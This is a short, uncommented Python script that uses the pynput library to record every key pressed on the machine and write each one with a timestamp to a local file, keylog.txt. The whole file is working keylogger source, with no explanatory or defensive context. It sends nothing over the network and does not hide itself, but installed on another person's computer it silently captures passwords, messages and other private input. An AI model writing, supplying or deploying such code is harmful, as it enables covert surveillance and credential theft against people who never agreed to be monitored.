from pynput import keyboard
import time

file = open("keylog.txt", "w")

def key_press(key):

    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    file.write(f"{timestamp} - {key}\n")
    file.flush()

with keyboard.Listener(on_press = key_press) as listener:
    listener.join()

file.close()
